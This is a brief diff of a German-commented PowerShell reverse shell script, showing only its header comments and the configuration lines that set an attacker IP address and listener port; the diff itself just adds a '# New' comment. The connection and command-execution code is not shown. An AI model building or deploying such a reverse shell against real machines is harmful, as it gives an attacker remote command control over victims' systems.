@@ -1,6 +1,6 @@
 # PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
 # Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
-
+# New
 # --- KONFIGURATION START ---
 $ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
 $port = 124           # <--- HIER IHREN LISTENER-PORT EINGEBEN!
